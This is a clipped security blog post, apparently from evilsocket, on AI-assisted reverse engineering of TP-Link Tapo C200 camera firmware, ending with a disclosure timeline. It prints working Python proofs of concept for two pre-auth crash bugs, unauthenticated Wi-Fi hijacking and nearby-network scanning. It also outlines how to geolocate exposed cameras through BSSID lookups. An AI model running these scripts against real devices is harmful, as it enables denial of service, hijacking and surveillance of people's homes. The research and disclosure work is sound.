---
title: "TP-Link Tapo C200: Hardcoded Keys, Buffer Overflows and Privacy in the Era of AI Assisted Reverse Engineering | evilsocket"
source: https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/
source_host: www.evilsocket.net
clip_date: 2026-09-24T10:33:32+08:00
trace_id: 195b55be-4647-43ed-9306-c95b4ad09941
content_hash: 42de148597a071713d4602ffb2befce13b073d8a95f48eee8665bb98008e4692
status: synced
tags:
  - 硬件逆向
  - 漏洞分析
series: null
feed_source: evilsocket·固件/IoT RCE
ai_summary: 通过AI辅助逆向TP-Link Tapo C200固件，发现硬编码SSL私钥和4个未授权漏洞（3个获CVE），影响约2.5万台公网暴露设备。
ai_summary_style: key-points:weak
images_status:
  total: 8
  succeeded: 8
  failed_urls: []
notion_page_id: 3e575244-d011-816d-bc7c-f2d06dc15ba0
ioc:
  cves:
    - CVE-2025-1099
    - CVE-2025-14299
    - CVE-2025-14300
    - CVE-2025-8065
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points:weak）**
>
> 通过AI辅助逆向TP-Link Tapo C200固件，发现硬编码SSL私钥和4个未授权漏洞（3个获CVE），影响约2.5万台公网暴露设备。
> 
> - **固件获取：** TP-Link固件仓库是无需鉴权的公开S3桶（`aws s3 ls s3://download.tplinkcloud.com/ --no-sign-request`），可下载所有设备全部版本；用tp-link-decrypt从其GPL代码中提取RSA密钥即可解密固件，解出bootloader、内核与SquashFS。
> - **AI辅助手法：** Grok做前期资料检索，GhidraMCP接Cline与Claude Opus/Sonnet 4，让AI解释函数并递归重命名变量与参数，把`FUN_0042eb7c(...)`逐步还原为`handleConnectAp(...)`式可读代码，从而理清HTTP处理器与发现协议。
> - **硬编码私钥：** `tp_manage`内嵌启动时不重新生成、所有设备共用的SSL私钥（类似C500的CVE-2025-1099），同网段攻击者可MitM解密摄像头的HTTPS视频流量。
> - **CVE-2025-8065：** 2020端口ONVIF SOAP XML解析（`soap_parse_and_validate_request`）无边界检查，发送十万个XML元素即可溢出崩溃，需断电重启，CVSS 7.1。
> - **CVE-2025-14299：** 443端口HTTPS对`Content-Length`仅做`atoi()`无校验，32位下`4294967295`整数溢出致崩溃，CVSS 7.1。
> - **CVE-2025-14300与定位风险：** `connectAp`无鉴权，可断网、诱导连接攻击者网络并持久控制（CVSS 8.7）；`scanApList`同样免鉴权，可枚举周边SSID/BSSID/信号强度，配合apple_bssid_locator查Apple定位API可将摄像头物理位置定位到数米内。
> - **披露与利益冲突：** 遵循90+30天流程但被反复推迟，150天后（12月19日）才公开，次日TP-Link发布公告；TP-Link自身是CNA，又把CVE数量用作营销对比指标，存在结构性利益冲突。

Hi friends and welcome to the last post for this year! Whenever someone asks me how to get started with reverse engineering, I always give the same advice: buy the cheapest IP camera you can find. These devices are self-contained little ecosystems - they have firmware you can extract, network protocols you can sniff, and mobile apps you can decompile. Chances are, you’ll find something interesting. At worst, you’ll learn a lot about assembly and embedded systems. At best, you’ll find some juicy vulnerability and maybe learn how to exploit it!

![tp-link tapo c200](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b0f1040670e40a46.jpg)

I own several TP-Link Tapo C200 cameras myself. They’re cheap (less than 20 EUR from Italy), surprisingly stable, and I genuinely like them - they just work. One weekend, I decided just for fun to take my own advice. The Tapo C200 has been around for a while and has had [a few CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-11936/product_id-83493/Tp-link-Tapo-C200-Firmware.html) discovered and more or less patched over the years, so I honestly wasn’t expecting to find much in the latest firmware. However, I wanted to use this chance to perform some **AI assisted reverse engineering** and test whether I could still find anything at all.

I documented the entire process live on [Arcadia](https://discord.com/channels/1100085665766572142/1396102661257957396) - my thought process, the dead ends, the AI prompts that worked and the ones that didn’t. If you want the raw, unfiltered version with screenshots and videos of things crashing, go check that out.

This post is the cleaned-up version of that journey, where I wanted to show how I approach firmware analysis these days, now that we have AI. You will notice that in several instances I will be particularly lazy and delegate to AI things I could have done manually and/or inferred myself after some more work. Keep in mind that while I *am* generally lazy, this was also an experiment in integrating and documenting how effective AI can be for security research and reverse engineering, and especially in making them accessible to less experienced/sophisticated researchers/attackers.

What started as a lazy weekend project turned into finding a few security vulnerabilities that affect about [25,000 of these devices directly exposed on the internet](https://www.zoomeye.ai/searchResult?q=IlRQUkktREVWSUNFIg==).

![tapo c200 devices map](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/40ac9261bac30aba.png)

## Getting the Firmware

### Tools

-   Old friend [JD-GUI](https://java-decompiler.github.io/) to reverse the Android app and get a sense of things
-   [The AWS CLI](https://aws.amazon.com/cli/) to download the firmware image.
-   [binwalk](https://github.com/ReFirmLabs/binwalk) for firmware inspection.
-   [Grok](https://grok.com/) to give a quick AI assisted look into prior research.

The first step is always obtaining the firmware binary file and this time it was super easy! After some [basic reversing](https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/) of the [Tapo Android app](https://play.google.com/store/apps/details?id=com.tplink.iot&hl=it), I found out that TP-Link have their entire firmware repository in an open S3 bucket. No authentication required. So, you can list and download every version of every firmware they’ve ever released for any device they ever produced:

```bash
$ aws s3 ls s3://download.tplinkcloud.com/ --no-sign-request --recursive
```

[The entire output is here, for the curious](https://www.evilsocket.net/images/2025/tapo/bucket_contents.txt). This provides access to the firmware image of every TP-Link device - routers, cameras, smart plugs, you name it. A reverse engineer’s candy store.

I grabbed version **1.4.2 Build 250313 Rel.40499n** for the C200 (Hardware Revision 3), named `Tapo_C200v3_en_1.4.2_Build_250313_Rel.40499n_up_boot-signed_1747894968535.bin`, and started poking around. However, the first attempt at identifying its format via binwalk was not successful, indicating that some sort of encryption or obfuscation was in place.

And here is where I started using AI. I used Grok to [do some deep research](https://x.com/i/grok/share/t9RzvgCRwIluVGnXMu39VVxDx) on how to decrypt the firmware for these cameras. Since I knew other hackers worked on this before, I delegated searching into hundreds of relevant web pages to the AI:

![grok](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f2238fad390f5b27.png)

### Decrypting the Firmware

### Tools

-   The [tp-link-decrypt](https://github.com/robbins/tp-link-decrypt) tool to decrypt the firmware image.
-   [binwalk](https://github.com/ReFirmLabs/binwalk) for firmware inspection.

Thanks to Grok, the [tp-link-decrypt](https://github.com/robbins/tp-link-decrypt) tool and the fact that every firmware image for every device seems to be encrypted the same exact way, we can now decrypt the firmware. The tool extracts RSA keys from TP-Link’s own GPL code releases - they publish the decryption keys themselves as part of their open source obligations.

Credits to @watchfulip for the [original extensive TP-Link firmware research](https://watchfulip.github.io/28-12-24/tp-link_c210_v2.html) and @tangrs for [finding that the relevant binaries are published in TP-Link GPL code dumps and how to extract keys from them](https://blog.tangrs.id.au/2025/09/22/decrypting-tplink-smart-switch-firmware/).

```bash
$ git clone https://github.com/robbins/tp-link-decrypt
$ cd tp-link-decrypt
$ ./preinstall.sh        # Install dependencies
$ ./extract_keys.sh      # Extract RSA keys from TP-Link's GPL code
$ make
$ bin/tp-link-decrypt Tapo_C200_firmware.bin
```

After decryption, the firmware revealed a fairly standard structure: a bootloader, a kernel, and a SquashFS root filesystem.

```bash
$ binwalk -e Tapo_C200_v3_1.4.2_decrypted.bin
```

![binwalk](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e903b17758fecb37.jpg)

## Hunting for Bugs

### Tools

-   [Ghidra](https://github.com/NationalSecurityAgency/ghidra) to decompile and understand the MIPS binaries
-   [GhidraMCP](https://github.com/LaurieWired/GhidraMCP) to let an AI connect to my running Ghidra instance and support me in the process.
-   [Cline](https://github.com/cline/cline) to ask AI to explore the filesystem and find interesting components.
-   A mix of [Anthropic's Opus and Sonnet 4](https://claude.ai/).

Once extracted, I used AI and Cline to explore the filesystem in search of which components handle the discovery protocol, camera web API, video streaming, etc all discovered earlier while reversing the Android app.

> Claude Opus 4: "this is the firmware of an ipcam, i'm trying to find where the webapp that serves the API is managed" [pic.twitter.com/NrgtKGUD8h](https://t.co/NrgtKGUD8h)
> 
> — Simone Margaritelli (@evilsocket) [July 18, 2025](https://twitter.com/evilsocket/status/1946238860007973282?ref_src=twsrc%5Etfw)

Loading Ghidra and giving a quick look at the `tp_manage` binary, revealed the first interesting thing:

![tp\_manage](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cf3d355e8455acf9.webp)

This private key is not generated at boot. Similarly to [CVE-2025-1099 for the C500](https://nvd.nist.gov/vuln/detail/CVE-2025-1099), the C200 embeds in its firmware the private key that serves the SSL for a few APIs. If you’re on the same network as a camera, you can MitM and decrypt their HTTPS traffic with keys you extracted from the firmware image - without ever touching the hardware. For a *security* camera streaming video of people’s homes, this is… not ideal.

I kept loading the other interesting binaries and exploring them in Ghidra using AI to quickly get a sense of the main features and possible entry points for an attacker.

**Asking AI to explain a function** and its relation to the other functions proved to be very useful for instance to understand encryption / obfuscation routines and network protocol handlers. This allows you to go from here:

![decompiled](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d22b7e2f003c8d69.webp)

To a higher level understanding that the AI can provide:

![udp crc](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2631a4244c54f4af.webp)

Another technique I found particularly effective is asking the AI to analyze a given function of interest and **rename its variables and parameters to something meaningful based on context**. Then do the same for the functions it calls, recursively following the branches you’re interested in. After a few iterations, what started as `FUN_0042eb7c(undefined2 *param_1, undefined4 param_2, int param_3)` becomes `handleConnectAp(connection *conn, int flags, json *params)` - and suddenly the decompiled code reads almost like the original source.

This iterative refinement approach, which I find a great example of human-AI collaboration where neither alone would be as efficient, is how I mapped most of the HTTP handlers, discovery protocol, and so on. What follows is the bottom line of my findings. For more details on the process, refer to [the original Discord thread](https://discord.com/channels/1100085665766572142/1396102661257957396).

As a side note, I did not investigate (much) the exploitability of the following bugs to achieve code execution, mostly because I’m not familiar with MIPS, and it was not my intent. You can however do it relatively easily once [obtained a shell via physical access](https://www.hacefresko.com/posts/tp-link-tapo-c200-unauthenticated-rce), due to the presence of the `/bin/gdbserver` binary in the firmware.

## Bug 1: Pre-Auth ONVIF SOAP XML Parser Memory Overflow (CVE-2025-8065)

The Tapo C200 exposes an ONVIF service via the `/bin/main` server listening on port 2020 for interoperability with standard video management systems. The problem is in how it parses SOAP XML requests.

When processing XML elements, the parser (`soap_parse_and_validate_request` at `0x0045ae8c`) calls `ds_parse` without any bounds checking on the number of elements or total memory allocation. Send it enough XML elements, and you’ll overflow allocated memory.

Here’s the PoC:

```python
#!/usr/bin/env python3
import urllib.request
import sys

TARGET = sys.argv[1]
ONVIF_PORT = 2020

# Generate 100,000 XML elements - this will overflow the parser
params = ''.join([f'<SimpleItem Name="Param{i}" Value="{"X" * 100}"/>' 
                  for i in range(100000)])

body = f'''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
<soap:Body>
<CreateRules xmlns="http://www.onvif.org/ver20/analytics/wsdl">
<ConfigurationToken>test</ConfigurationToken>
<Rule>
<Name>TestRule</Name>
<Type>tt:CellMotionDetector</Type>
<Parameters>{params}</Parameters>
</Rule>
</CreateRules>
</soap:Body>
</soap:Envelope>'''

req = urllib.request.Request(f"http://{TARGET}:{ONVIF_PORT}/onvif/service", 
                             data=body.encode('utf-8'))
req.add_header('Content-Type', 'application/soap+xml')
urllib.request.urlopen(req, timeout=30)
```

Send this, and the camera crashes, requiring a power cycle to recover.

> [pic.twitter.com/JQ64e9KAJp](https://t.co/JQ64e9KAJp)
> 
> — Simone Margaritelli (@evilsocket) [July 19, 2025](https://twitter.com/evilsocket/status/1946705477745733940?ref_src=twsrc%5Etfw)

[CVE-2025-8065](https://nvd.nist.gov/vuln/detail/CVE-2025-8065) has been assigned to this bug.

CVSS v4.0 Score: 7.1 / High  
CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N

## Bug 2: Pre-Auth HTTPS Content-Length Integer Overflow (CVE-2025-14299)

The HTTPS server routine running on port 443 has a classic integer overflow in its `Content-Length` header parsing. The vulnerable function at `0x004bd054` does this:

```c
iVar1 = atoi(value);
param_1->content_length = iVar1;
```

That’s it. No bounds checking. No validation. Just raw `atoi()` on user input.

On a 32-bit system, `atoi("4294967295")` causes integer overflow, resulting in undefined behavior. In this case, the camera crashes:

```python
#!/usr/bin/env python3
import socket
import ssl
import sys

TARGET = sys.argv[1]

request = f"""POST / HTTP/1.1\r
Host: {TARGET}\r
Content-Length: 4294967295\r
Content-Type: application/octet-stream\r
Connection: close\r
\r
AAAA"""

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = context.wrap_socket(sock, server_hostname=TARGET)
ssl_sock.connect((TARGET, 443))
ssl_sock.send(request.encode())
```

> And two [pic.twitter.com/tt7eL7MA27](https://t.co/tt7eL7MA27)
> 
> — Simone Margaritelli (@evilsocket) [July 19, 2025](https://twitter.com/evilsocket/status/1946706143805387252?ref_src=twsrc%5Etfw)

Another crash - [CVE-2025-14299](https://nvd.nist.gov/vuln/detail/CVE-2025-14299) has been assigned to this bug.

CVSS v4.0 Score: 7.1 / High  
CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N

## Bug 3: Pre-Auth WiFi Hijacking (CVE-2025-14300)

The camera exposes an API endpoint called `connectAp` that’s used during initial setup to configure WiFi. The problem? It’s accessible **without any authentication**. Even after the camera is fully set up and connected to your network.

The vulnerable handler at `0x0042eb7c` processes the request without any auth checks:

```c
void connectApHandler(undefined2 *param_1,undefined4 param_2,int json_params)
{
    // No authentication check here - just processes the request
    jso_add_string(iVar3,"method","connectAp");
    jso_obj_add(iVar3,"params",iVar2);
    iVar1 = ds_tapo_handle(param_1);
}
```

> And three! [pic.twitter.com/2GZiG4bTm0](https://t.co/2GZiG4bTm0)
> 
> — Simone Margaritelli (@evilsocket) [July 22, 2025](https://twitter.com/evilsocket/status/1947620181871677492?ref_src=twsrc%5Etfw)

The exploit is trivial:

```python
#!/usr/bin/env python3
import urllib.request
import ssl
import sys

TARGET = sys.argv[1]

# No auth needed - just send it
payload = '{"method":"connectAp","params":{"onboarding":{"connect":{"ssid":"EVIL_NETWORK","bssid":"11:11:11:11:11:11","auth":3,"encryption":2,"rssi":3,"password":"hacked","pwd_encrypted":0}}}}'

context = ssl.create_default_context()
context.check_hostname = False  
context.verify_mode = ssl.CERT_NONE

req = urllib.request.Request(f"https://{TARGET}/", data=payload.encode('utf-8'))
req.add_header('Content-Type', 'application/json')
urllib.request.urlopen(req, context=context, timeout=10)
```

This allows a remote attacker to:

-   **Disconnect the camera** from its legitimate network (DoS)

If in WiFi range proximity:

-   **Force it to connect to an attacker-controlled network** (MitM)
-   **Intercept all video traffic** once on the malicious network (not that we really needed this since the HTTPS private key is shared by all devices, as mentioned earlier XD)
-   **Maintain persistent access** even if the owner changes their WiFi password

[CVE-2025-14300](https://nvd.nist.gov/vuln/detail/CVE-2025-14300) has been assigned to this bug.

CVSS v4.0 Score: 8.7 / High  
CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N

## Bug 4: Pre-Auth Nearby WiFi Network Scanning

Related to Bug 3, the `scanApList` method is also accessible without authentication - even when the device is not in onboarding mode. This endpoint returns a list of all WiFi networks visible to the camera:

```python
#!/usr/bin/env python3
import urllib.request
import ssl
import sys

TARGET = sys.argv[1]

payload = '{"method":"scanApList","params":{}}'

context = ssl.create_default_context()
context.check_hostname = False  
context.verify_mode = ssl.CERT_NONE

req = urllib.request.Request(f"https://{TARGET}/", data=payload.encode('utf-8'))
req.add_header('Content-Type', 'application/json')
response = urllib.request.urlopen(req, context=context, timeout=10)
print(response.read().decode())
```

A test on one of the devices exposed on the internet:

![Exploit output enumerating nearby Wi-Fi access points (SSIDs and BSSIDs) from an internet-exposed Tapo C200 camera](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f9e0eddac6f20450.png)

This is particularly concerning given the number of these devices exposed on the internet. An attacker can remotely enumerate WiFi networks in the camera’s vicinity, including:

-   **SSIDs** of nearby networks
-   **BSSIDs** (MAC addresses of access points)
-   **Signal strength** (useful for triangulation)
-   **Security configurations**

Here’s where it gets worse: tools like [apple_bssid_locator](https://github.com/darkosancanin/apple_bssid_locator) can query Apple’s location services API with a BSSID and return precise GPS coordinates.

This means an attacker can:

1.  Find an exposed Tapo camera via services like ZoomEye, Shodan or similar indexes
2.  Use `scanApList` to retrieve nearby WiFi BSSIDs
3.  Query Apple’s location database with those BSSIDs
4.  **Pinpoint the camera’s physical location to within a few meters**

Remote attackers can not only see what WiFi networks exist around a camera - they can determine exactly where that camera (and by extension, the home or business it’s monitoring) is located on a map.

## Disclosure

I’ve decided to follow the [industry standard](https://projectzero.google/vulnerability-disclosure-policy.html) **90+30 days** responsible disclosure process; here’s the timeline:

-   **July 22, 2025**: Sent initial report to TP-Link’s security team ([security@tp-link.com](mailto:security@tp-link.com)) with full technical details, PoC exploits and videos. All compiled according to [their guidelines](https://www.tp-link.com/en/press/security-advisory/).
-   **July 22, 2025**: Acknowledgment received.
-   **August 22, 2025**: TP-Link confirms they’re still reviewing the report
-   **September 27, 2025**: TP-Link responds and sets the timeline for the remediation patch to the end of November 2025.
-   **November 2025**: Nothing happens.
-   **December 1, 2025**: Sent follow up email, no response.
-   **December 4, 2025**: Sent another follow up email, which TP-Link responds to, further postponing the patch to the following week.
-   **The following week**: Nothing happens.
-   **December 19, 2025**: Public disclosure **after 150 days**.
-   **December 20, 2025**: TP-Link finally publishes a security advisory for CVE-2025-8065, CVE-2025-14299 and CVE-2025-14300.

The 90+30 period has long passed, so I decided to publish this writeup.

## Conflict Of Interest

[As of April 25, TP-Link is a CVE Numbering Authority (CNA)](https://www.tp-link.com/us/press/news/21730/). This means they have the authority to assign CVE identifiers for vulnerabilities in their own products - at least for the ones reported directly to them. And they [actively encourage responsible disclosure directly to their security team](https://www.tp-link.com/it/press/security-advisory/), which means they control a considerable pipeline of vulnerability reports.

On their [Security Commitment page](https://www.tp-link.com/us/landing/security-commitment/), TP-Link prominently displays charts comparing their CVE count to competitors. They explicitly market themselves as having fewer CVEs than Cisco, Netgear, and D-Link. They state they “aim to patch vulnerabilities within 90 days.”

There’s an obvious and structural conflict of interest when a vendor is allowed to be their own CNA while simultaneously using their CVE count as a marketing metric.
